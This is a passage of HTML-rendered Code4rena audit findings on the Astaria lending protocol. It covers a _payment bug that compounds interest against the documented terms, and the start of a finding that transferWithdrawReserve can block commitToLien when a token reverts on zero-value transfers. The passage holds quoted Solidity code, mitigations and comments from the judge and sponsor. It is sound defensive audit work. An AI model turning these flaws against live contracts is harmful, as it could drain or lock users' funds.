anymore</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienOwner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decreaseEpochLienCount</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk11\">IPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienOwner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getLienEpoch</span><span class=\"mtk1\">(</span><span class=\"mtk12\">end</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienMeta</span><span class=\"mtk1\">[</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">//full delete of point data for the lien</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">activeStack</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_removeStackPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">activeStack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">position</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payer</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Payment</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">activeStack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The main problem is in line 826. <code>stack.point.amount = owed.safeCastTo88();</code><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L826\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L826</a></p>\n<p>Here <code>stack.point.amount</code> becomes <code>stack.point.amount</code> + accrued interests, because <code>owed</code> is loan amount + accrued interests by this time.</p>\n<p><code>stack.point.amount</code> is the amount that user borrowed. So actually that line has just increased user’s debt. And in case if <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L830\">he didn’t pay all amount</a> of lien, then next time he will pay more interests, because interests <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L262\">depend on loan amount</a>.</p>\n<p>In the docs Astaria protocol claims that:</p>\n<blockquote>\n<p>All rates on the Astaria protocol are in simple interest and non-compounding.</p>\n</blockquote>\n<p><a href=\"https://docs.astaria.xyz/docs/protocol-mechanics/loanterms\">https://docs.astaria.xyz/docs/protocol-mechanics/loanterms</a></p>\n<p>You can check that inside “Interest rate” section.</p>\n<p>However <code>_payment</code> function is compounding interests.</p>\n<p>To avoid this, another field <code>interestsAccrued</code> should be introduced which will track already accrued interests.</p>\n<h3 id=\"tools-used-15\" style=\"position:relative;\"><a href=\"#tools-used-15\" aria-label=\"tools used 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VsCode</p>\n<h3 id=\"recommended-mitigation-steps-47\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-47\" aria-label=\"recommended mitigation steps 47 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>You need to store accrued interests by the moment of repayment to another variable <code>interestsAccrued</code>.</p>\n<p>And calculate <code>_getInterest</code> functon like this.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"119\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getInterest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Stack</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">pure</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delta_t</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">last</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestsAccrued</span><span class=\"mtk1\"> + (</span><span class=\"mtk12\">delta_t</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/574#event-8400652204\">SantiagoGregory (Astaria) acknowledged and commented via duplicate issue <code>#574</code></a>:</strong></p>\n<blockquote>\n<p>This is the intended flow, early payments will compound interest.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/574#issuecomment-1439156798\">Picodes (judge) commented via duplicate issue <code>#574</code></a></strong></p>\n<blockquote>\n<p>Keeping medium severity because of the mention in the doc stating that interests are non-compounding, so considering this is a broken functionality.</p>\n<p><a href=\"https://docs.astaria.xyz/docs/protocol-mechanics/loanterms\">https://docs.astaria.xyz/docs/protocol-mechanics/loanterms</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-32-certain-function-can-be-blocked-if-the-erc20-token-revert-in-0-amount-transfer-after-publicvaulttransferwithdrawreserve-is-called\" style=\"position:relative;\"><a href=\"#m-32-certain-function-can-be-blocked-if-the-erc20-token-revert-in-0-amount-transfer-after-publicvaulttransferwithdrawreserve-is-called\" aria-label=\"m 32 certain function can be blocked if the erc20 token revert in 0 amount transfer after publicvaulttransferwithdrawreserve is called permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/54\">[M-32] Certain function can be blocked if the ERC20 token revert in 0 amount transfer after <code>PublicVault#transferWithdrawReserve</code> is called</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/54\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/314\">KIntern_NA</a> and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/314\">KIntern_NA</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L295\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L295</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L421\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L421</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L359\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L359</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L372\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L372</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L384\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L384</a></p>\n<p>The function transferWithdrawReserve in Public Vault has no access control.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"120\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferWithdrawReserve</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">VaultData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadStorageSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">uint64</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      .</span><span class=\"mtk12\">epochData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      .</span><span class=\"mtk12\">withdrawProxy</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// prevents transfer to a non-existent WithdrawProxy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// withdrawProxies are indexed by the epoch where they&#39;re deployed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// prevent transfer of more assets then are available</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">WithdrawProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\">).</span><span class=\"mtk11\">increaseWithdrawReserveReceived</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">withdrawBalance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">WithdrawReserveTransferred</span><span class=\"mtk1\">(</span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">withdrawProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">epochData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\">].</span><span class=\"mtk12\">withdrawProxy</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">timeToEpochEnd</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">withdrawProxy</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk12\">epochData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk12\">withdrawProxy</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">drainBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">WithdrawProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">withdrawProxy</span><span class=\"mtk1\">).</span><span class=\"mtk11\">drain</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">epochData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">withdrawProxy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">drainBalance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">WithdrawProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\">).</span><span class=\"mtk11\">increaseWithdrawReserveReceived</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">drainBalance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>If this function is called, the token balance is transfered to withdrawProxy</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"121\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p>and</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"122\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>However, according to</p>\n<p><a href=\"https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers\">https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers</a></p>\n<p>Some tokens (e.g. LEND) revert when transfering a zero value amount.</p>\n<p>If <code>ERC20(asset()).balanceOf(address(this))</code> return 0, the transfer revert.</p>\n<p>The impact is that transferWithdrawReserve is also used in the other place:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"123\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">commitToLien</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IAstariaRouter.Commitment </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">whenNotPaused</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">, ILienToken.Stack[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payout</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span 